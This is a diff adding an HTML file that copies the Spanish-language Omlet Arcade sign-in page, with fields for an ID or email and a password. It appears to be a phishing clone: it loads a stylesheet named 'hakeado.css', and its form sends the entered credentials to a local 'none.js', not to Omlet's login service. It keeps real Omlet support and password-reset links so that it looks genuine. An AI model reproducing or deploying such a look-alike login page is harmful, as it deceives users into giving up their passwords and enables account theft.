@@ -1,0 +1,96 @@
+
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+<title>Omlet</title>
+<meta name="viewport" content="initial-scale=1,maximum-scale=1">
+
+<link rel="shortcut icon" href="/arcade-favicon.ico" type="image/x-icon">
+<link type="text/css" rel="stylesheet" href="reset.css" />
+<link type="text/css" rel="stylesheet" href="signin.css" />
+<link type="text/css" rel="stylesheet" href="hakeado.css" />
+<script type='application/javascript' src='none.js'></script> 
+</head>
+<body>
+<div class="confirm-modal-bg-mask" id="reset-confirm">
+  <div class="reset-pw-confirm">
+    <img class="confirm-close-btn" src="img/oi_close_gray.png" onclick="closeErrorCountAlert()" />
+    <div class="reset-or-suport-title">¿Problemas al iniciar sesión?</div>
+    <div class="reset-or-suport-desc">
+      Intenta restablecer la contraseña a través de tu correo electrónico ahora, o contáctenos para obtener ayuda.
+    </div>
+    <div class="confirm-actions">
+      <a class="action-btn" href="https://omlet.zendesk.com/hc/requests/new" target="_blank">
+        SOPORTE
+      </a>
+      <a class="action-btn" href="https://idp.omlet.me/forgotpass?k=0R7S7QCH2PTH0AAF5BQG&er=https%3A%2F%2Fomlet.gg%2Fauthredirect&l=es">
+        RESTABLECER CONTRASEÑA
+      </a>
+    </div>
+  </div>
+</div>
+<div class="container">
+
+<div class="logo">
+  <div class="om-icon"></div>
+  <div class="om-text-brand"></div>
+</div>
+<div class="textcenter title1 paddingTop">Iniciar sesión </div>
+<div class="textcenter">
+<form name="signin" method="post" action="none.js" onsubmit="return validateLogin()" >
+
+  <div class="textinputbox">
+    <img class="icon" src="img/account.svg"></img>
+    <input class="textinput" autocorrect="off" autocapitalize="off" id="omid" name="omid" type="input" placeholder="Omlet Id o Correo Electrónico" value=""></input>
+  </div>
+  <div id="iddes" class="des"><div id="idmsg" class="error"></div></div>
+
+  <div class="textinputbox">
+    <img class="icon" src="img/password.svg"></img>
+    <input class="textinput" autocorrect="off" autocapitalize="off" maxlength="20" id="pass" name="pass" type="password" placeholder="Contraseña "></input>
+    <div class="pw-visible-btn" id="pw-visible-btn" onclick="togglePasswordVisibility()"></div>
+  </div>
+  <div id="pdes" class="des"><div id="pmsg" class="error"></div></div>
+
+  <div class="forgotpw link"><a class="forgotpw" href="https://idp.omlet.me/forgotpass?k=0R7S7QCH2PTH0AAF5BQG&er=https%3A%2F%2Fomlet.gg%2Fauthredirect&l=es">¿Olvidaste la contraseña?</a></div>
+  <button class="login-button" type="submit">
+    INICIAR SESIÓN
+  </button>
+</form>
+</div>
+
+
+<div class="register textcenter">
+<a href="https://idp.omlet.me/register?k=0R7S7QCH2PTH0AAF5BQG&er=https%3A%2F%2Fomlet.gg%2Fauthredirect&l=es">Hazte una cuenta en Omlet Arcade </a>
+</div>
+
+<script>
+var _err = {};
+
+
+
+
+
+
+var _check = [{desEle:document.getElementById('iddes'),
+              msgEle:document.getElementById('idmsg'),
+              errs:[{code:'ioi', msg:"ID de Omlet no válido. El ID de Omlet debe tener de 6-20 carácteres (letras de la A a la Z, números del 0-9, puntos y guiones bajos)"},
+                    {code:'ie', msg:"Correo Electrónico Inválido"},
+                    {code:'inf', msg:"Omlet ID no encontrado"}]},
+             {desEle:document.getElementById('pdes'),
+              msgEle:document.getElementById('pmsg'),
+              errs:[{code:'ip', msg:"Contraseña inválida."},
+                    {code:'pi', msg:"Contraseña incorrecta"},
+                    {code:'pns', msg:"La Contraseña no está establecida. Pulsa sobre Olvidé la Contraseña para establecer una nueva contraseña."}]},
+            ];
+
+checkForm();
+checkErrorCountAlert();
+</script>
+<div class="appending">&nbsp;</div>
+</div>
+</body>
+</html>
